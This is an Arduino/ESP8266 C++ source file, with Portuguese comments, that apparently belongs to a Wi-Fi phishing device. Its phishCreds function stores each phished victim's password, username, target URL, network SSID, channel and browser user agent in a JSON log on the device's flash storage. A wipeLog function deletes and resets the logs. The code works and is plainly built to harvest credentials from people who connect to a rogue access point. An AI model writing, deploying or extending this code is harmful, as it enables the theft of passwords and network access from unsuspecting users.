#include <FS.h>
#include <ArduinoJson.h>

void startSPIFFS() {
  SPIFFS.begin();

  // Cria ou abre o arquivo de log
  File f1 = SPIFFS.open("/log", "a");
  f1.close();

  // Cria ou inicializa o arquivo de logs de phishing
  File f2 = SPIFFS.open("/phishinglogs", "w");
  f2.println("[]");
  f2.close();
}

void logging(const char *logString) {
  File logFile = SPIFFS.open("/log", "a");
  if (!logFile) {
    Serial.println("Could not create log file");
    return;
  }

  Serial.print(logString);
  if (logFile.println(logString)) {
    Serial.println("  -->> Log was written");
  } else {
    Serial.println("  -->> Log write failed");
  }

  logFile.close();
}

JsonArray parseOrCreate(DynamicJsonDocument &doc, const String &json) {
  DeserializationError error = deserializeJson(doc, json);
  if (error) {
    // Cria um novo array se o JSON estiver vazio ou inválido
    return doc.createNestedArray();
  }
  return doc.as<JsonArray>();
}

void phishCreds(String url, String user, String pass, String userAgent) {
  stationPhished = 1;
  logging("phishCreds :: CLIENT PHISHED");

  File configFile = SPIFFS.open("/phishinglogs", "r");
  if (!configFile) {
    logging("phishCreds :: Failed to open phishing logs file for reading");
    return;
  }

  // Lê o conteúdo do arquivo
  size_t size = configFile.size();
  if (size == 0) {
    logging("phishCreds :: Phishing logs file is empty");
    configFile.close();
    return;
  }

  std::unique_ptr<char[]> buf(new char[size + 1]);
  configFile.readBytes(buf.get(), size);
  buf[size] = '\0';
  configFile.close();

  // Parseia o JSON existente ou cria um novo array
  DynamicJsonDocument doc(1024);
  JsonArray array = parseOrCreate(doc, buf.get());

  // Adiciona um novo objeto ao array
  JsonObject obj = array.createNestedObject();
  obj["url"] = url;
  obj["ssid"] = ssid;
  obj["hidden"] = hidden;
  obj["channel"] = channel;
  obj["user"] = user;
  obj["pass"] = pass;
  obj["userAgent"] = userAgent;

  // Salva o array atualizado no arquivo
  File configFileA = SPIFFS.open("/phishinglogs", "w");
  if (!configFileA) {
    logging("phishCreds :: Failed to open phishing logs file for writing");
    return;
  }

  serializeJson(array, configFileA);
  serializeJsonPretty(array, Serial); // Exibe o JSON atualizado no Serial
  configFileA.close();
}

void wipeLog(const char *file, const char *empty) {
  SPIFFS.remove(file); // Remove o arquivo existente
  File f = SPIFFS.open(file, "w"); // Cria um novo arquivo vazio
  if (f) {
    f.println(empty); // Escreve conteúdo vazio (ex.: "[]")
    f.close();
  } else {
    Serial.println("Failed to create or overwrite the log file");
  }
}
